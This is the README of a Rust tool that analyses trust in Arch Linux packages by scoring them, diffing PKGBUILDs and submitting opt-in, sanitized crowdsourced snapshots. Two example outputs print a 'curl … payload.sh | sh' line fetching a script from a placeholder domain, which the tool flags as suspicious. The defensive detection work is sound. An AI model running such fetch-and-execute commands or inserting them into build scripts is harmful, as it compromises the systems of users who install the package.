# CPAC — Community Package Analysis Client
> *A package trust layer for Arch-based Linux distributions.*

---

## What is CPAC?

While traditional package managers answer:

> "Can I install this?"

CPAC answers:

> "Should I trust this?"

CPAC is a standalone package trust and advisory tool for Arch-based Linux.
It works on Arch, EndeavourOS, Garuda, CachyOS, Manjaro, and CinderOS.
It is not tied to any single distribution.

---

## Philosophy

- CPAC is a **package advisor**, not a gatekeeper
- The user always has the final say
- Trust scores are transparent and explainable
- CPAC never blocks standard tools like `yay` or `paru`
- Designed to remain useful regardless of the future state of AUR

---

## Repository Structure

```
cpac/
├── src/
│   ├── main.rs
│   ├── cli/          # Command parsing
│   ├── resolver/     # Package resolution logic
│   ├── trust/        # Trust scoring engine
│   ├── audit/        # System-wide audit engine
│   ├── backends/     # pacman, AUR, future sources
│   └── cache/        # Local metadata cache
├── docs/
│   ├── trust-algorithm.md
│   ├── backends.md
│   └── contributing.md
├── Cargo.toml
└── README.md
```

---

## Core Responsibilities

1. **Package Discovery** — search across all sources
2. **Package Resolution** — find the best available source
3. **Package Trust Analysis** — score and surface trust signals before install

---

## Trust Tiers

```
Official Arch Repo   →  Trust: Official
COPR                 →  Trust: Third Party
AUR                  →  Trust: Community
Local Package        →  Trust: Unknown
```

> Trust tier is separate from trust score.
> CPAC generates an independent score for every package regardless of source.

---

## Trust Scores

Every package receives a score out of 100. Scores are derived from:

- Repository source
- Package age
- Maintainer history
- Package popularity
- Build history
- Package integrity
- PKGBUILD diff results (local history or crowdsourced consensus)
- Known security advisories

Scores are always explainable — CPAC shows which signals contributed to the final number.
The exact scoring algorithm is documented in `docs/trust-algorithm.md` and may evolve over time.

---

## PKGBUILD Diffing

CPAC compares PKGBUILD changes to detect suspicious modifications before install or upgrade.
This is one of the strongest signals in the trust score, since it directly targets the
attack pattern seen in incidents like Atomic Arch (hijacked PKGBUILDs on orphaned packages).

### Local Diffing (upgrades)

When upgrading an already-installed package, CPAC diffs the new PKGBUILD against the
previously installed version, which CPAC keeps cached locally. No network or consent
required — this is purely local history.

```
$ cpac install firefox

PKGBUILD changed since last install:
  + curl https://new-domain.example/payload.sh | sh
  
⚠️  Suspicious change detected: remote script execution added
Trust Score: 22/100 (was 80/100 before this update)

Continue? [Y/n]
```

### Crowdsourced Diffing (fresh installs)

For a package the user has never installed before, there's no local history to diff
against. CPAC can instead compare the incoming PKGBUILD against snapshots voluntarily
submitted by other users, to check whether it matches what's generally seen in the wild.

- **Opt-in only** — disabled by default, enabled via explicit consent prompt on first run
- **Anonymous** — no account, username, or machine identifier attached to submissions
- **User-selectable submission format**, chosen per-install or set as a default:
  - **Hash/signature only** — privacy-first, just enough to detect "this differs from consensus"
  - **Full PKGBUILD text** — more useful for diffing and showing *what* changed, more data shared
- Submissions are aggregated in the `cpac-trust-db` repository as community data

```
$ cpac install some-new-package

No local history for this package.
Compare against community PKGBUILD snapshots? [Y/n]

Source: AUR
Community snapshots: 14 matching, 1 differing

⚠️  Your version differs from 14/15 known snapshots
Trust Score: 41/100

Continue? [Y/n]
```

### Consent

On first run, CPAC asks once whether the user wants to participate in crowdsourced
diffing, and at what level of detail:

```
$ cpac

CPAC can compare packages against anonymized data from other users
to help detect tampered PKGBUILDs. Participation is optional.

All submissions are sanitized locally before sending — see 'Submission
Sanitization' below for what gets removed.

Submit data to help others?
  [1] No, don't submit anything
  [2] Yes, hash/signature only
  [3] Yes, full PKGBUILD (Recommended, helps us with better accuracy)

Choice (Default: 2):
```

This choice is stored locally and can be changed anytime via `cpac config`.

> Default is hash/signature only, not the recommended option. A "Recommended" label
> should encourage informed users to opt up — it should not be paired with a default
> that hands out the most data to anyone who presses Enter without reading.

---

## Submission Sanitization

Before any PKGBUILD data leaves the machine — under either hash or full-text
submission — CPAC runs it through a two-pass local sanitizer. This applies
only to the crowdsourced submission path; nothing here affects what the user
sees locally in `cpac trust` / `cpac install` output.

The problem this solves: a sanitizer can't reliably tell "this line is private"
apart from "this line is suspicious" using the same signal, because malicious
PKGBUILD changes are often unusual-looking on purpose — same as personal paths
or hostnames. Redacting everything unfamiliar would strip out exactly the
content that makes a PKGBUILD diff useful. Keeping everything unfamiliar risks
leaking local machine details. So the two concerns are split into separate
passes that run in order.

### Pass 1 — Structural Redaction (privacy)

Runs first, always, regardless of consent level chosen. Targets content
identifiable by *pattern/position*, not by how unusual it looks:

- Local paths matching the current user's home directory (`/home/<user>/…`)
- The local machine's hostname, if it appears in the file
- Local IP addresses (RFC 1918 ranges, loopback)
- Email addresses that aren't already the package's public maintainer field

These are deterministic matches — a line either matches one of these patterns
or it doesn't. There is no "unsure" case at this stage. Redacted segments are
replaced with a placeholder (e.g. `[REDACTED:path]`) rather than deleted, so
the diff structure stays intact for comparison.

### Pass 2 — Anomaly Detection (security)

Runs second, on the already-redacted content. This is where unfamiliar or
suspicious lines — an unexpected `curl | sh`, an unrecognized domain, inline
shell evaluation — get flagged as trust signals.

Critically, these flags are surfaced to **the current user, locally**, as
part of the trust score calculation, independent of whether the user opts
into submission at all. This is what resolves the original dilemma: a line
CPAC isn't sure about is never silently dropped *or* silently kept in the
submission pipeline based on a guess. It's evaluated for risk first, the
user sees that risk locally regardless of their consent choice, and only
the narrow Pass 1 patterns ever get redacted before anything is shared.

```
Local PKGBUILD analysis (before any submission decision):
  [REDACTED:path]     ← stripped, never leaves this machine
  curl https://unfamiliar-domain.example/x.sh | sh
                       ← flagged as a trust signal, shown to you now,
                         NOT redacted (not a privacy match — a security one)
```

> Sanitization runs silently and automatically before every submission —
> no per-submission preview step. Locally-flagged anomalies are always
> visible via `cpac diff`/`cpac trust` output, whether or not the user
> ever submits anything.

---

## Local Metadata Cache

CPAC maintains a local cache to keep all commands fast and offline-capable:

```
~/.cpac/cache/
  packages.db       # source, maintainer, last update, popularity
  trust.db          # trust scores, audit history
  advisories.db     # known security advisories
  pkgbuilds.db       # locally installed PKGBUILD snapshots, for upgrade diffing
```

---

## Commands

```bash
cpac search <package>       # search across all sources
cpac install <package>      # smart install with trust analysis
cpac remove <package>       # remove a package
cpac update                 # update all sources
cpac trust <package>        # full trust report for a package
cpac diff <package>         # show PKGBUILD diff (local or crowdsourced)
cpac audit                  # system-wide trust audit
cpac audit <package>        # trust analysis for one package
cpac aur enable             # enable AUR (with warning)
cpac aur disable            # disable AUR
cpac config                 # change crowdsourcing/consent preferences
```

---

## Example: cpac install

```
$ cpac install some-package

Source: AUR                         Trust: Community
Maintainer: johndoe                 Maintainer Age: 4 years
Package Age: 4 years                Last Update: 3 days ago
Popularity: High                    Recent Builds: Passing

Trust Score: 67/100
Build Script Changes: No suspicious changes detected

Continue? [Y/n]
```

---

## Example: cpac trust

```
$ cpac trust vscode

Package:          vscode
Repository:       Official
Maintainer:       Microsoft
Package Age:      5 years
Security Issues:  None Known

══════════════════════════════
Trust Score: 96/100
Recommendation: SAFE
══════════════════════════════
```

---

## Example: cpac audit

```
$ cpac audit

Installed Packages: 842

  Official:     721
  Third Party:   86
  Community:     30
  Unknown:        5

Warnings:
  foo-bin       [Trust: 34/100 — New maintainer, recent PKGBUILD change]
  bar-git       [Trust: Unknown — Installed outside CPAC]
  baz-nightly   [Trust: 41/100 — No signed package]

View Details? [Y/n]
```

---

## yay / paru Compatibility

CPAC does not block external AUR helpers:

```
$ yay install foo

[CPAC] Package foo was installed outside CPAC.
[CPAC] Trust status: Unknown.
[CPAC] Run 'cpac audit foo' for a post-install trust analysis.
```

---

## Build Roadmap

Status as of this revision: `cpac search` and `cpac trust` are implemented and working.

```
Current
├── search ✅
└── trust  ✅
```

### v0.1.x — Polish (low effort, high impact)

These make the existing commands feel professional before any new commands are added.

1. **Exact match search ranking** — currently `cpac search firefox` returns hundreds of
   unranked matches. Rank results: exact name match → name starts with query → name
   contains query → description match.
2. **Search result limit** — default to showing 25 of N results with
   `Showing 25 of 687 results. Use --all to view everything.` Add a `--all` flag.
3. **Make trust score visually prominent** — it's the main thing users care about,
   it should not look like just another line of output:
   ```
   ══════════════════════════════
   Trust Score: 80/100
   Recommendation: SAFE
   ══════════════════════════════
   ```
4. **Better unknown data handling** — replace vague strings like
   `Package Age: Official package (age data not tracked)` with an explicit
   `Package Age: Unknown` + `Reason: Metadata unavailable`. Transparency about
   what CPAC doesn't know is itself a trust signal.
5. **`cpac --version`** — outputs `CPAC 0.1.0` + tagline.
6. **`cpac --help`** — lists available commands with the tagline.

### v0.2 — `cpac audit`

The next command to build, and the one most likely to make someone go
*"wait, that's actually useful."* Even a simple first version — package counts
by trust tier, plus a flat list of warnings — is enough to ship.

### v0.3 — Metadata cache

`~/.cpac/cache/` (`packages.db`, `trust.db`, `advisories.db`). Makes search and
trust reports fast, and is the foundation for future offline support.

### v0.4 — AUR support

Don't rush this — get `search`, `trust`, and `audit` rock solid on official
repos first. Trust score tuning can wait; for MVP it's enough that an official
package scores higher than a random AUR package most of the time. Refine the
algorithm later, after the structure is proven.

### v0.5 — `cpac install`

### v1.0 — First public release

---

### Explicitly Out of Scope Until Core CLI Is Solid

Do not spend time on these until `search`, `trust`, and `audit` are stable:

- COPR integration
- GUI
- CinderOS ISO
- Calamares
- RPM conversion
- Package installation (beyond v0.5 `cpac install`)
- Website
- Discord
- Branding tweaks

The PKGBUILD diffing and crowdsourced trust features documented above remain
the long-term direction for CPAC, but sequence after v0.4/v0.5 — they depend
on AUR support and the metadata cache being in place first.

| Stage | Focus |
|---|---|
| v0.4+ | Local PKGBUILD diffing on upgrade (no consent needed, purely local) |
| v0.4+ | Pass 1 structural redaction (paths/hostnames/emails) — required before any submission code ships |
| v0.5+ | Crowdsourced PKGBUILD diffing, consent flow, Pass 2 anomaly surfacing, `cpac-trust-db` submission pipeline |

---

## Related Projects

All repos live under `github.com/SabeeirSharrma/`

| Project | Role |
|---|---|
| `cinderos` | Reference implementation — ships CPAC by default |
| `cpac-trust-db` | Community-maintained advisory data + opt-in crowdsourced PKGBUILD snapshots |
| `website` | Project site |

---

## Written In

**Rust** — performance-first, consistent with the project's identity.

---

## Installation (on any Arch-based distro)

```bash
pacman -S cpac
```

---

*CPAC is an open source project. Contributions welcome.*
*CPAC is not the CinderOS package manager. It is a package trust layer for Arch.*